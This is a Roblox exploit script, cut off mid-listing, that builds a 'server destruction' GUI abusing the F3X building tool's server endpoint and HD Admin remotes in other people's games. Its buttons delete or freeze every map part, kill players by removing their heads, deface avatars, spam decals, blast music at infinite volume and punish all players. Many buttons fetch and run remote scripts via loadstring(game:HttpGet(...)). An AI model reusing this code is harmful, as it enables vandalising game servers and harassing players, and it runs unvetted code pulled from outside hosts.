local LocalPlayers = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local player = LocalPlayers.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Declarar la GUI principal directamente sin jumpscare
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MusicGUI"
screenGui.ResetOnSpawn = false
screenGui.Enabled = true
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 480, 0, 1200)
mainFrame.Position = UDim2.new(0.5, -240, 0.5, -450)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local DECAL_IDS = {
    "121677205364391", "118487641604307", "131859056684038", "76543614457095",
    "120598592517133", "121003235993061", "116096918776430",
    "140260078233082", "119538796316073", "115333545778701",
    "98737388382619", "17536349606", "127701215006572", "16870692930", "11250457006",
    "97165905484478", "97498821202018", "89318092341639", "105142844398851"
}

if playerGui:FindFirstChild("MusicGUI") and playerGui.MusicGUI ~= screenGui then 
    playerGui.MusicGUI:Destroy() 
end

local HDAdminClient = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
local RequestCommand = HDAdminClient and HDAdminClient:FindFirstChild("Signals") and HDAdminClient.Signals:FindFirstChild("RequestCommandSilent")
local function safeRemote(cmd) 
    if RequestCommand then 
        task.spawn(function()
            pcall(function()
                RequestCommand:InvokeServer(cmd) 
            end)
        end)
    end 
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed then
        if input.KeyCode == Enum.KeyCode.Insert or input.KeyCode == Enum.KeyCode.RightControl then
            mainFrame.Visible = not mainFrame.Visible
        end
    end
end)

local titleBar = Instance.new("TextLabel")
titleBar.Size = UDim2.new(1, 0, 0, 45)
titleBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
titleBar.TextColor3 = Color3.fromRGB(0, 0, 0)
titleBar.Text = "g00by665len v10.5 f3x"
titleBar.Font = Enum.Font.GothamBold
titleBar.TextSize = 22
titleBar.BorderSizePixel = 2
titleBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
titleBar.Parent = mainFrame

local function createSection(pos, sizeY, title)
    local line = Instance.new("Frame")
    line.Size = UDim2.new(1, 0, 0, 2)
    line.Position = UDim2.new(0, 0, 0, pos.Y.Offset - 30)
    line.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    line.Parent = mainFrame
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 25)
    label.Position = UDim2.new(0, 0, 0, pos.Y.Offset - 28)
    label.BackgroundTransparency = 1
    label.Text = title:upper()
    label.TextColor3 = Color3.fromRGB(0, 0, 0)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 14
    label.Parent = mainFrame
    local frame = Instance.new("ScrollingFrame")
    frame.Size = UDim2.new(1, -20, 0, sizeY)
    frame.Position = pos
    frame.BackgroundTransparency = 1
    frame.ScrollBarThickness = 6
    frame.CanvasSize = UDim2.new(0, 0, 0, 0)
    frame.Parent = mainFrame
    local grid = Instance.new("UIGridLayout")
    grid.Parent = frame
    grid.CellSize = UDim2.new(0, 145, 0, 35)
    grid:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        frame.CanvasSize = UDim2.new(0, 0, 0, grid.AbsoluteContentSize.Y + 10)
    end)
    return frame
end

local function styleButton(btn)
    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextColor3 = Color3.fromRGB(0, 0, 0)
    btn.BorderSizePixel = 1
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 11
    btn.TextWrapped = true
end

local function getF3XRemote()
    local tool = player.Character and player.Character:FindFirstChildOfClass("Tool") or player.Backpack:FindFirstChildOfClass("Tool")
    if tool and tool:FindFirstChild("SyncAPI") then return tool.SyncAPI:FindFirstChild("ServerEndpoint") end
    return nil
end

local function createDestBtn(txt, parent, func)
    local btn = Instance.new("TextButton")
    styleButton(btn)
    btn.Text = txt
    btn.Parent = parent
    btn.MouseButton1Click:Connect(func)
end

local function setF3XDecal(remote, part, asset, side)
    task.spawn(function()
        pcall(function()
            remote:InvokeServer("CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}})
            remote:InvokeServer("SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://".. asset}})
        end)
    end)
end

local skyObject = nil
local function createSky(id)
    local remote = getF3XRemote()
    if not remote then return end
    
    safeRemote(";fog 9999.99999999")
    safeRemote(";time 7")
    safeRemote(";fogcolor black")

    if skyObject then
        pcall(function() remote:InvokeServer("Remove", {skyObject}) end)
        skyObject = nil
    end
    local pos = CFrame.new(0, 5, 0)
    skyObject = remote:InvokeServer("CreatePart", "Normal", pos, workspace)
    remote:InvokeServer("CreateMeshes", {{Part = skyObject}})
    remote:InvokeServer("SyncMesh", {{Part = skyObject, MeshId = "rbxassetid://111891702759441", Scale = Vector3.new(6000, 6000, 6000), TextureId = "rbxassetid://"..id}})
    remote:InvokeServer("SyncCollision", {{Part = skyObject, CanCollide = false}})
    remote:InvokeServer("SyncAnchor", {{Part = skyObject, Anchored = true}})
    remote:InvokeServer("SetLocked", {skyObject}, true)
end

local function removeSky()
    local remote = getF3XRemote()
    if remote and skyObject then
        pcall(function() remote:InvokeServer("Remove", {skyObject}) end)
        skyObject = nil
    end
end

local function doDecalSpam(id)
    local remote = getF3XRemote()
    if not remote then return end
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and player.Character and not v:IsDescendantOf(player.Character) then
            task.spawn(function()
                pcall(function()
                    remote:InvokeServer("SetLocked", {v}, false)
                    local faces = {Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Right, Enum.NormalId.Left, Enum.NormalId.Bottom, Enum.NormalId.Top}
                    for _, face in ipairs(faces) do
                        task.spawn(function()
                            remote:InvokeServer("CreateTextures", {{Part = v, Face = face, TextureType = "Decal"}})
                            remote:InvokeServer("SyncTexture", {{Part = v, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..id}})
                        end)
                    end
                    remote:InvokeServer("SetLocked", {v}, true)
                end)
            end)
        end
    end
end

local function removeDecals()
    local remote = getF3XRemote()
    if not remote then return end
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("Decal") and player.Character and not v:IsDescendantOf(player.Character) then
            task.spawn(function()
                pcall(function()
                    remote:InvokeServer("Remove", {v})
                end)
            end)
        end
    end
end

local f3xSec = createSection(UDim2.new(0, 10, 0, 80), 100, "F3X Destrucción")
createDestBtn("g00by search", f3xSec, function() loadstring(game:HttpGet("https://gist.githubusercontent.com/sprunkigris/ea4436e69732efade4976aebcfdb689d/raw"))() end)
createDestBtn("F3X POLARIS", f3xSec, function() loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/swW60uW8gffCYePI/raw"))() end)
createDestBtn("lookidd", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-loopkidd-gui-v4-f3x-122839"))() end)
createDestBtn("protokidd gui f3x", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-protokidd-f3x-gui-63391"))() end)
createDestBtn("trafficConehax gui f3x", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-TrafficConeHax-f3x-gui-reupload-135819"))() end)

createDestBtn("team armed gui", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Team-Armed-F3X-Gui-new-k00pgui-V8-port-hehe-161457"))() end)
createDestBtn("roadblocks gui", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Edited-Roadblocks-Gui-f3x-224508"))() end)
createDestBtn("skidderkidd gui", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Free-HeadAdmin-Skidderkidd-F3x-Gui-246137"))() end)
createDestBtn("k00pkidd v8 gui", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-k00pgui-v8-F3X-EDITON-52670"))() end)
createDestBtn("pickle gui", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Pickle567421-gui-f3x-226632"))() end)

-- [CAMBIO] Enlace actualizado para natural disasters map
createDestBtn("natural disasters map", f3xSec, function() loadstring(game:HttpGet("https://gist.githubusercontent.com/sprunkigris/e3fff6dab2cfbf24e70157d9cd72be13/raw"))() end)
createDestBtn("prision life map", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-PRISON-LIFE-F3X-MAP-BY-WXA-138601"))() end)
createDestBtn("john doe", f3xSec, function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-John-Doe-F3X-Script-86500"))() end)

createDestBtn("f3x trippy sky", f3xSec, function()
    local remote = getF3XRemote()
    if remote and skyObject then
        task.spawn(function()
            local speedDeg = 90
            while skyObject and skyObject.Parent do
                local deltaRotation = CFrame.Angles(math.rad(speedDeg), math.rad(speedDeg * 2), math.rad(speedDeg))
                remote:InvokeServer("SyncRotate", {{Part = skyObject, CFrame = skyObject.CFrame * deltaRotation}})
                task.wait()
            end
        end)
    end
end)

local f3xData = {
    {Text = "F3X ID GUI", Link = "https://rawscripts.net/raw/Universal-Script-Average-F3X-Gui-38529"},
    {Text = "Fog Black", Command = ";fogcolor black "},
    {Text = "Floor Red", Command = ";insert 8152247859"},
    {Text = "Spawn Hacked", Command = ";insert 53326"},
    {Text = "Disco Mode", Command = ";disco"},
    {Text = "Glitch Fog", Command = ";fog 0.1"}
}
for _, info in ipairs(f3xData) do
    local btn = Instance.new("TextButton")
    styleButton(btn)
    btn.Text = info.Text
    btn.Parent = f3xSec
    btn.MouseButton1Click:Connect(function()
        if info.Link then loadstring(game:HttpGet(info.Link))() else safeRemote(info.Command) end
    end)
end

createDestBtn("SPIN SKY", f3xSec, function()
    local remote = getF3XRemote()
    if remote and skyObject then
        task.spawn(function()
            local speed = 0.5
            while skyObject and skyObject.Parent do
                local rotation = CFrame.Angles(math.rad(speed * 30), math.rad(speed * 50), math.rad(speed * 20))
                remote:InvokeServer("SyncMove", {{Part = skyObject, CFrame = skyObject.CFrame * rotation}})
                task.wait()
            end
        end)
    end
end)

local serverSec = createSection(UDim2.new(0, 10, 0, 220), 160, "Server Destrucción")

createDestBtn("Realm 3", serverSec, function()
    safeRemote(";punish all")
    loadstring(game:HttpGet("https://gist.githubusercontent.com/sprunkigris/3b377cecde6a149c525469f83ac42540/raw"))()
    createSky(DECAL_IDS[4])
    safeRemote(";btools me")
    
    safeRemote(";Music 136356992500400")
    safeRemote(";volume inf")
    safeRemote(";Pitch 0.29")
    
    task.delay(2, function()
        local remote = getF3XRemote()
        if remote then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") then
                    local isPlayerPart = false
                    for _, p in ipairs(LocalPlayers:GetPlayers()) do
                        if p.Character and v:IsDescendantOf(p.Character) then
                            isPlayerPart = true
                            break
                        end
                    end
                    if not isPlayerPart then
                        task.spawn(function()
                            pcall(function()
                                remote:InvokeServer("SetLocked", {v}, true)
                            end)
                        end)
                    end
                end
            end
        end
    end)
    
    task.delay(3, function()
        safeRemote(";respawn all")
    end)
end)

createDestBtn("skeletons sky", serverSec, function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/sprunkigris/bd8bfa6066079c74b1c2597ff534f89f/raw"))()
end)

createDestBtn("I0rb", serverSec, function()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-lOrb-f3x-216283"))()
end)

createDestBtn("kill all f3x", serverSec, function()
    local remote = getF3XRemote()
    if not remote then return end
    for _, p in ipairs(LocalPlayers:GetPlayers()) do
        if p.Character and p.Character:FindFirstChild("Head") then
            task.spawn(function()
                pcall(function()
                    local head = p.Character.Head
                    remote:InvokeServer("SetLocked", {head}, false)
                    remote:InvokeServer("Remove", {head})
                end)
            end)
        end
    end
end)

local avatarAllActive = false
local avatarConnections = {}

local function applyAvatarEffect(targetPlayer)
    if targetPlayer == player then return end
    
    task.spawn(function()
        safeRemote(";r6 " .. targetPlayer.Name)
        safeRemote(";char " .. targetPlayer.Name .. " isaack67XD")
        
        local remote = getF3XRemote()
        if not remote then return end

        local char = targetPlayer.Character
        if not char then return end

        local faces = {
            Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Right, 
            Enum.NormalId.Left, Enum.NormalId.Bottom, Enum.NormalId.Top
        }
        
        local whiteColorArgs = {}
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                remote:InvokeServer("SetLocked", {part}, false)
                table.insert(whiteColorArgs, {Part = part, Color = Color3.fromRGB(255, 255, 255), UnionColoring = false})
            end
        end
        if #whiteColorArgs > 0 then
            pcall(function() remote:InvokeServer("SyncColor", whiteColorArgs) end)
        end

        local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
        if torso then
            pcall(function()
                remote:InvokeServer("CreateTextures", {
                    {Part = torso, Face = Enum.NormalId.Front, TextureType = "Decal"},
                    {Part = torso, Face = Enum.NormalId.Back, TextureType = "Decal"}
                })
                remote:InvokeServer("SyncTexture", {
                    {Part = torso, Face = Enum.NormalId.Front, TextureType = "Decal", Texture = "rbxassetid://119538796316073"},
                    {Part = torso, Face = Enum.NormalId.Back, TextureType = "Decal", Texture = "rbxassetid://140260078233082"}
                })
            end)
        end

        local head = char:FindFirstChild("Head")
        if head then
            pcall(function()
                remote:InvokeServer("CreateTextures", {{Part = head, Face = Enum.NormalId.Front, TextureType = "Decal"}})
                remote:InvokeServer("SyncTexture", {{Part = head, Face = Enum.NormalId.Front, TextureType = "Decal", Texture = "rbxassetid://101342346025512"}})
            end)
        end

        local limbsArgsCreate = {}
        local limbsArgsSync = {}
        for _, partName in ipairs({"Left Arm", "Right Arm", "Left Leg", "Right Leg"}) do
            local part = char:FindFirstChild(partName)
            if part then
                local tId = (partName == "Left Arm" or partName == "Right Arm") and "115333545778701" or "131859056684038"
                for _, face in ipairs(faces) do
                    table.insert(limbsArgsCreate, {Part = part, Face = face, TextureType = "Decal"})
                    table.insert(limbsArgsSync, {Part = part, Face = face, TextureType = "Decal", Texture = "rbxassetid://"..tId})
                end
            end
        end
        if #limbsArgsCreate > 0 then
            pcall(function()
                remote:InvokeServer("CreateTextures", limbsArgsCreate)
                remote:InvokeServer("SyncTexture", limbsArgsSync)
            end)
        end
    end)
end

createDestBtn("avatar all f3x", serverSec, function()
    avatarAllActive = not avatarAllActive
    
    if avatarAllActive then
        for _, p in ipairs(LocalPlayers:GetPlayers()) do
            if p ~= player then applyAvatarEffect(p) end
        end

        local playerAddedConn = LocalPlayers.PlayerAdded:Connect(function(p)
            if p ~= player and avatarAllActive then
                local conn = p.CharacterAdded:Connect(function()
                    if avatarAllActive then applyAvatarEffect(p) end
                end)
                table.insert(avatarConnections, conn)
            end
        end)
        table.insert(avatarConnections, playerAddedConn)
    else
        for _, conn in ipairs(avatarConnections) do
            pcall(function() conn:Disconnect() end)
        end
        avatarConnections = {}
    end
end)

createDestBtn("delete sky others", serverSec, function()
    local remote = getF3XRemote()
    if not remote then return end
    
    for _, v in ipairs(game:GetService("Lighting"):GetChildren()) do
        if v:IsA("Sky") or v:IsA("Atmosphere") then
            task.spawn(function() pcall(function() remote:InvokeServer("Remove", {v}) end) end)
        end
    end
    
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v ~= skyObject then
            local isOtherSky = false
            
            local mesh = v:FindFirstChildOfClass("SpecialMesh")
            if mesh and mesh.MeshId == "rbxassetid://111891702759441" then
                isOtherSky = true
            end
            
            if string.find(v.Name:lower(), "sky") then
                isOtherSky = true
            end
            
            if isOtherSky then
                task.spawn(function()
                    pcall(function() 
                        remote:InvokeServer("SetLocked", {v}, false)
                        remote:InvokeServer("Remove", {v}) 
                    end)
                end)
            end
        end
    end
end)

createDestBtn("BTOOLS (f3x)", serverSec, function() safeRemote(";btools me") end)

-- [CAMBIO] Anchored all actualizado para NO afectar a los jugadores
createDestBtn("Anchored all", serverSec, function()
    local remote = getF3XRemote()
    if not remote then return end
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v ~= skyObject then
            local isPlayerPart = false
            for _, p in ipairs(LocalPlayers:GetPlayers()) do
                if p.Character and v:IsDescendantOf(p.Character) then
                    isPlayerPart = true
                    break
                end
            end
            
            if not isPlayerPart then
                task.spawn(function()
                    pcall(function()
                        remote:InvokeServer("SetLocked", {v}, false)
                        remote:InvokeServer("SyncAnchor", {{Part = v, Anchored = true}})
                        remote:InvokeServer("SetLocked", {v}, true)
                    end)
                end)
            end
        end
    end
end)

createDestBtn("Unanchored all", serverSec, function()
    local remote = getF3XRemote()
    if not remote then return end
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v ~= skyObject and player.Character and not v:IsDescendantOf(player.Character) then
            task.spawn(function()
                pcall(function()
                    remote:InvokeServer("SetLocked", {v}, false)
                    remote:InvokeServer("SyncAnchor", {{Part = v, Anchored = false}})
                    remote:InvokeServer("SetLocked", {v}, true)
                end)
            end)
        end
    end
end)

createDestBtn("placa base", serverSec, function()
    local remote = getF3XRemote()
    if not remote then return end
    
    task.spawn(function()
        local basePos = CFrame.new(0, 0, 0)
        local base = remote:InvokeServer("CreatePart", "Normal", basePos, workspace)
        
        remote:InvokeServer("SyncResize", {{Part = base, CFrame = basePos, Size = Vector3.new(3000, 1, 3000)}})
        remote:InvokeServer("SyncColor", {{Part = base, Color = Color3.fromRGB(0, 100, 0), UnionColoring = false}})
        remote:InvokeServer("SyncMaterial", {{Part = base, Material = Enum.Material.Grass}})
        remote:InvokeServer("SyncAnchor", {{Part = base, Anchored = true}})
        remote:InvokeServer("SetLocked", {base}, true)
        remote:InvokeServer("SetName", {base}, "PlacaBaseHack")
    end)
end)

createDestBtn("REALM", serverSec, function()
    local remote = getF3XRemote()
    if not remote then return end
    safeRemote(";punish all")
    task.spawn(function()
        for _, v in ipairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") or v:IsA("UnionOperation") then
                task.spawn(function() remote:InvokeServer("Remove", {v}) end)
            end
        end
    end)
    createSky(DECAL_IDS[1])
    local basePos = CFrame.new(0, 5, 0)
    local base = remote:InvokeServer("CreatePart", "Normal", basePos, workspace)
    remote:InvokeServer("SyncResize", {{Part = base, CFrame = basePos, Size = Vector3.new(512, 16, 512)}})
    remote:InvokeServer("SyncMaterial", {{Part = base, Material = Enum.Material.Concrete}})
    remote:InvokeServer("SyncColor", {{Part = base, Color = Color3.new(0.5, 0.5, 0.5), UnionColoring = false}})
    remote:InvokeServer("SyncAnchor", {{Part = base, Anchored = true}})
    remote:InvokeServer("SetLocked", {base}, true)
    
    local spawnPos = CFrame.new(34.5, 8.1, -26)
    local spawna = remote:InvokeServer("CreatePart", "Spawn", spawnPos, workspace)
    remote:InvokeServer("SyncResize", {{Part = spawna, CFrame = spawnPos, Size = Vector3.new(20, 10, 20)}})
    setF3XDecal(remote, spawna, DECAL_IDS[1], Enum.NormalId.Top)
    remote:InvokeServer("SyncMaterial", {{Part = spawna, Transparency = 1}})
    remote:InvokeServer("SyncAnchor", {{Part = spawna, Anchored = true}})
    remote:InvokeServer("SetLocked", {spawna}, true)
    
    local pos1 = CFrame.new(74.143, 24, -25.232)
    local rules = remote:InvokeServer("CreatePart", "Normal", pos1, workspace)
    setF3XDecal(remote, rules, DECAL_IDS[2], Enum.NormalId.Left)
    remote:InvokeServer("SyncResize", {{Part = rules, CFrame = pos1, Size = Vector3.new(4, 23, 37)}})
    remote:InvokeServer("SyncAnchor", {{Part = rules, Anchored = true}})
    remote:InvokeServer("SetLocked", {rules}, true)
    
    safeRemote(";res all ;r6 all ;time 14 ;music 72387397195218 ;volume inf ;pitch 1.3")
end)

createDestBtn("REALM 2", serverSec, function()
    local Req = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
    Req:InvokeServer(";btools me")
    Req:InvokeServer(";fogcolor black ;time 7")
    Req:InvokeServer(";punish all")
    local backpack = player:WaitForChild("Backpack")
    local function getf3x()
        for _,v in ipairs(backpack:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
        if player.Character then
            for _,v in ipairs(player.Character:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
        end
    end
    local f3x = getf3x()
    if not f3x then return end
    local srv = f3x.SyncAPI.ServerEndpoint
    for _,v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("UnionOperation") then task.spawn(function() pcall(function() srv:InvokeServer("Remove",{v}) end) end) end
    end
    local function nP(cf,sz)
        local p = srv:InvokeServer("CreatePart","Normal",cf,workspace)
        srv:InvokeServer("SyncResize",{{Part=p,Size=sz,CFrame=cf}})
        srv:InvokeServer("SyncMaterial",{{Part=p,Material=Enum.Material.Concrete}})
        srv:InvokeServer("SyncColor",{{Part=p,Color=Color3.fromRGB(130,130,130),UnionColoring=false}})
        srv:InvokeServer("SyncAnchor",{{Part=p,Anchored=true}})
        srv:InvokeServer("SyncCollision",{{Part=p,CanCollide=true}})
        srv:InvokeServer("SetLocked",{p},true)
        return p
    end
    local function dc(p,f,id)
        srv:InvokeServer("CreateTextures",{{Part=p,Face=f,TextureType="Decal"}})
        srv:InvokeServer("SyncTexture",{{Part=p,Face=f,TextureType="Decal",Texture="rbxassetid://"..id}})
    end
    local bcf = CFrame.new(44,5,-22)
    local bsz = Vector3.new(100,16,100)
    local base = nP(bcf,bsz)
    srv:InvokeServer("SetName",{base},"z238z realm")
    nP(bcf * CFrame.new(0, 40+bsz.Y,0), Vector3.new(bsz.X, 4, bsz.Z))
    dc(nP(CFrame.new(74.143,24,3.7),Vector3.new(4,23,37)),Enum.NormalId.Left,"76543614457095")
    dc(nP(CFrame.new(1.143,24,-25.232),Vector3.new(4,23,37)),Enum.NormalId.Right,"121677205364391")
    dc(nP(CFrame.new(1.143,24,10.786),Vector3.new(4,23,37)),Enum.NormalId.Right,"131859056684038")
    local spcf = CFrame.new(bcf.X+8, bcf.Y+bsz.Y/2-5, bcf.Z)
    local s = srv:InvokeServer("CreatePart","Spawn",spcf,workspace)
    srv:InvokeServer("SyncResize",{{Part=s,Size=Vector3.new(20,10,20),CFrame=spcf}})
    srv:InvokeServer("SyncAnchor",{{Part=s,Anchored=true}})
    dc(s,Enum.NormalId.Top,"78777846189756")
    srv:InvokeServer("SyncMaterial",{{Part=s,Transparency=1}})
    srv:InvokeServer("SetLocked",{s},true)
    Req:InvokeServer(";res all ;r6 all ;music 92448940262206 ;volume inf ;pitch 0.19 ;btools ;sm welcome to realme  by g00by")
end)

createDestBtn("delete respawns", serverSec, function()
    local remote = getF3XRemote()
    if not remote then return end
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("SpawnLocation") then
            task.spawn(function()
                pcall(function()
                    remote:InvokeServer("SetLocked", {v}, false)
                    remote:InvokeServer("Remove", {v})
                end)
            end)
        end
    end
end)

createDestBtn("create respawn", serverSec, function()
    local remote = getF3XRemote()
    if not remote or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
    task.spawn(function()
        local pos = player.Character.HumanoidRootPart.CFrame - Vector3.new(0, 3, 0)
        local spawnPart = remote:InvokeServer("CreatePart", "Spawn", pos, workspace)
        remote:InvokeServer("SyncResize", {{Part = spawnPart, Size = Vector3.new(11, 1, 11), CFrame = pos}})
        remote:InvokeServer("SyncColor", {{Part = spawnPart, Color = Color3.fromRGB(220, 20, 60), UnionColoring = false}})
        remote:InvokeServer("SyncMaterial", {{Part = spawnPart, Material = Enum.Material.Fabric}})
        remote:InvokeServer("SyncAnchor", {{Part = spawnPart, Anchored = true}})
        
        local targetFaces = {
            Enum.NormalId.Front,
            Enum.NormalId.Back,
            Enum.NormalId.Top,
            Enum.NormalId.Bottom
        }
        for _, face in ipairs(targetFaces) do
            setF3XDecal(remote, spawnPart, "72769576980317", face)
        end

        remote:InvokeServer("SetLocked", {spawnPart}, true)
    end)
end)

createDestBtn("welcome", serverSec, function()
    local remote = getF3XRemote()
    if not remote or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
    
    task.spawn(function()
        local hrp = player.Character.HumanoidRootPart
        local spawnPos = hrp.CFrame + (hrp.CFrame.LookVector * 6)
        
        local part = remote:InvokeServer("CreatePart", "Normal", spawnPos, workspace)
        remote:InvokeServer("SyncResize", {{Part = part, Size = Vector3.new(24, 14, 2), CFrame = spawnPos}})
        remote:InvokeServer("SyncMaterial", {{Part = part, Material = Enum.Material.Slate}})
        remote:InvokeServer("SyncColor", {{Part = part, Color = Color3.fromRGB(59, 66, 82), UnionColoring = false}})
        remote:InvokeServer("SyncCollision", {{Part = part, CanCollide = false}})
        remote:InvokeServer("SyncAnchor", {{Part = part, Anchored = true}})
        
        setF3XDecal(remote, part, "131425870857705", Enum.NormalId.Front)
        setF3XDecal(remote, part, "131425870857705", Enum.NormalId.Back)
        
        remote:InvokeServer("SetLocked", {part}, true)
    end)
end)

createDestBtn("REMOVE SKY", serverSec, function() removeSky() end)
createDestBtn("REMOVE DECALS", serverSec, function() removeDecals() end)

local updateCustomId

for i, id in ipairs(DECAL_IDS) do createDestBtn("SKYBOX "..i, serverSec, function() createSky(id) if updateCustomId then updateCustomId(id) end end) end
for i, id in ipairs(DECAL_IDS) do createDestBtn("DECAL SPAM "..i, serverSec, function() doDecalSpam(id) if updateCustomId then updateCustomId(id) end end) end

local musicSec = createSection(UDim2.new(0, 10, 0, 420), 160, "Music Scripts")

createDestBtn("fuck h fuck hern", musicSec, function()
    safeRemote(";music 97281366944934")
    safeRemote(";volume inf")
    safeRemote(";pitch 0.0546")
end)

local songs = {
    {Name = "theme 1 g00by665len", ID = "16190761193", Pitch = 0.87, Volume = "inf"},
    {Name = "stop Music", ID = " ", Pitch = 0, Volume = "inf"},
    {Name = "body rolls full song", ID = "73218319760209", Pitch = 0.06, Volume = "inf"},
    {Name = "k00p's theme reverb", ID = "92448940262206", Pitch = 0.19, Volume = "inf"},
    {Name = "c00lkidd theme speed", ID = "120678432260694", Pitch = 8, Volume = "inf"},
    {Name = "bloodpop", ID = "70404094303163", Pitch = 0.08, Volume = "inf"},
    {Name = "bloodpop volumen", ID = "79766207703529", Pitch = 0.34, Volume = "inf"},
    {Name = "2006 music", ID = "80426460944830", Pitch = 0.056, Volume = "inf"},
    {Name = "rainmig man", ID = "74412933936974", Pitch = 0.58, Volume = "inf"},
    {Name = "gaben apartado remix", ID = "88982673611296", Pitch = 0.09, Volume = "inf"},
    {Name = "jumpstyle real", ID = "83163403313802", Pitch = 3.4, Volume = "inf"},
    {Name = "better alone", ID = "140730184604467", Pitch = 0.056, Volume = "inf"},
    {Name = "the ro full song", ID = "77823195036035", Pitch = 0.47, Volume = "inf"},
    {Name = "theme 2 g00by00lan", ID = "130801780664741", Pitch = 0.2, Volume = 50},
    {Name = "theme g00by00lan", ID = "139607639508776", Pitch = 0.2, Volume = 10},
    {Name = "Slow C00lkidd", ID = "95156028272944", Pitch = 0.2, Volume = "inf"},
    {Name = "1+1 theme", ID = "79641123960085", Pitch = 0.2, Volume = "inf"},
    {Name = "roblox funk", ID = "136932193331774", Pitch = 1, Volume = "inf"},
    {Name = "crab speed up", ID = "5410086218", Pitch = 1.2, Volume = "inf"},
    {Name = "China meme", ID = "121922837560201", Pitch = 0.22, Volume = "inf"},
    {Name = "k00p Theme", ID = "1839246711", Pitch = 0.9, Volume = "inf"},
    {Name = "c00lkidd Theme", ID = "95156028272944", Pitch = 0.3, Volume = "inf"}, 
    {Name = "retrokidd oid Theme", ID = "104879348278763", Pitch = 0.8, Volume = "inf"},
    {Name = "الله أكبر", ID = "124956805967048", Pitch = 1, Volume = "inf"},
    {Name = "Allah is great.", ID = "85390427326662", Pitch = 0.13, Volume = "inf"},
    {Name = "wont'stop US", ID = "1847661821", Pitch = 1.3, Volume = "inf"},
    {Name = "spooy skeletons", ID = "122552583844805", Pitch = 0.2, Volume = "inf"},
    {Name = "AHHHHH", ID = "3152833592", Pitch = 0.8, Volume = "inf"},
    {Name = "Lnickys Theme", ID = "86412047196482", Pitch = 1, Volume = "inf"},
    {Name = "Gothic", ID = "139488665764275", Pitch = 1, Volume = "inf"},
    {Name = "Backroom", ID = "120817494107898", Pitch = 0.8, Volume = "inf"},
    {Name = "Erica(ww2Germany)", ID = "102894811708275", Pitch = 0.1, Volume = "inf"},
    {Name = "sonic.exe", ID = "133180219581309", Pitch = 0.1, Volume = "inf"},
    {Name = "re join・realm join", ID = "9069609200", Pitch = 1, Volume = "inf"},
    {Name = "CAN'T STOP RAVING", ID = "89787069440374", Pitch = 1, Volume = "inf"},
    {Name = "java 1x3x5x6 Theme", ID = "94284750410104", Pitch = 0.2, Volume = "inf"},
    {Name = "colkax Theme", ID = "71485248296105", Pitch = 1, Volume = "inf"},
    {Name = "fhfh", ID = "132512957453594", Pitch = 1, Volume = "inf"},
    {Name = " music removed '", ID = "102295928741521", Pitch = 0.14, Volume = "inf"},
    {Name = "jump style", ID = "90426128566369", Pitch = 1, Volume = "inf"},
    {Name = "USSRДля нашей родины", ID = "109261572535017", Pitch = 0.1, Volume = "inf"},
    {Name = "GETOUT!!!", ID = "17573042535", Pitch = 1, Volume = "inf"},
    {Name = "SANEEES", ID = "100093014571503", Pitch = 1, Volume = "inf"},
    {Name = "HERE I COME", ID = "78534559289195", Pitch = 1, Volume = "inf"},
    {Name = "sad song", ID = "125591252722564", Pitch = 0.1, Volume = "inf"},
